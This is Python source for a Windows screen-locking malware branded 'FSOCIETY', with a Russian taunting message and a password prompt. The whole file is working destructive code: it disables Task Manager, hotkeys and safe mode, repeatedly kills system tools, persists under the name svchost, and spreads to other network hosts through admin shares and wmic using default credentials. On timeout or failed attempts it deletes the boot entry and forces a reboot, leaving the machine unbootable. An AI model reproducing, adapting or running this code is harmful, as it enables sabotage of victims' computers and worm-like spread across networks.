import subprocess, sys, os, time, threading, tempfile, tkinter as tk, urllib.request, ctypes, winreg, shutil, re, socket

for lib, name in [("pygame","pygame"),("keyboard","keyboard")]:
    try: __import__(lib)
    except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

import pygame, keyboard

PASSWORD = "1601"
MAX_ATTEMPTS = 5
TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
attempts_left = MAX_ATTEMPTS

def run_hidden(cmd):
    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def protect_process():
    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except: pass

def kill_taskmgr_ultimate():
    while True:
        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","explorer.exe"]:
            run_hidden(f"taskkill /f /im {p}")
        time.sleep(0.05)

def disable_win_key():
    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for sub, name in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                k = winreg.OpenKey(hkey, sub, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(k)
            except: pass
    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
        try: keyboard.block_key(k)
        except: pass
    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
        try: keyboard.add_hotkey(c, lambda:0, suppress=True)
        except: pass

def unblock_all():
    try: keyboard.unhook_all()
    except: pass
    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    except: pass
    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for sub, name in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                k = winreg.OpenKey(hkey, sub, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(k)
            except: pass

def get_timer():
    try:
        if os.path.exists(TIMER_FILE):
            with open(TIMER_FILE) as f: return float(f.read())
    except: pass
    end = time.time() + 3600
    os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
    with open(TIMER_FILE, 'w') as f: f.write(str(end))
    return end

def timer_check_loop():
    while True:
        if get_timer() - time.time() <= 0: destroy_windows_forever()
        time.sleep(5)

def destroy_windows_forever():
    run_hidden('bcdedit /delete {current} /f')
    run_hidden('shutdown /r /t 0 /f')
    os._exit(0)

def hide_process():
    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except: pass

def block_safe_mode():
    run_hidden('bcdedit /deletevalue {current} safeboot')
    run_hidden('bcdedit /set {current} recoveryenabled no')

def scan_network():
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
    except: return []

def infect_network():
    my_path = os.path.abspath(__file__)
    for ip in scan_network():
        try:
            run_hidden(f'net use \\\\{ip}\\C$ /user:admin admin')
            shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
            run_hidden(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"')
        except: pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
                winreg.CloseKey(k)
            except: pass
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
    except: pass

def anim_fsociety():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    a.protocol("WM_DELETE_WINDOW", lambda: None)
    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
    lbl.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        lbl.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20))
    sub.pack(pady=20)
    text = "тебя приветствует"
    for i in range(len(text)+1):
        sub.config(text=text[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

class WinLocker:
    def __init__(self):
        global attempts_left
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.bind("<Alt-F4>", lambda e: None)
        self.win.bind("<Escape>", lambda e: None)
        self.win.bind("<Win_L>", lambda e: None)
        self.win.bind("<Win_R>", lambda e: None)
        self.win.focus_force()
        
        self.timer_end = get_timer()
        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
        self.update_timer()
        
        msg = f"""Вот чего доводит интернет.

Вот смотри, ты скачивал игры или что там из интернета?
Вот доскачался. Сиди и жуй мой винлокер.

FSOCIETY тебя приветствует!

Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
ПК перезагрузить получится, но избавиться от меня - нет.
Я везде. Я в твоём роутере.
Я знаю все твои данные.
У меня есть cookies файлы, пароли, логины, почты и т.д.

МЫ FSOCIETY.
YOU FUCK.

ПОПЫТОК: {MAX_ATTEMPTS}"""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
        
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0: destroy_windows_forever()
        h, m, s = int(remaining//3600), int((remaining%3600)//60), int(remaining%60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            unblock_all()
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            try: os.remove(TIMER_FILE)
            except: pass
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
                time.sleep(2); destroy_windows_forever()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    protect_process()
    disable_win_key()
    hide_process()
    threading.Thread(target=kill_taskmgr_ultimate, daemon=True).start()
    threading.Thread(target=timer_check_loop, daemon=True).start()
    threading.Thread(target=infect_network, daemon=True).start()
    add_to_startup()
    block_safe_mode()
    anim_fsociety()
    WinLocker()
    tk.mainloop()
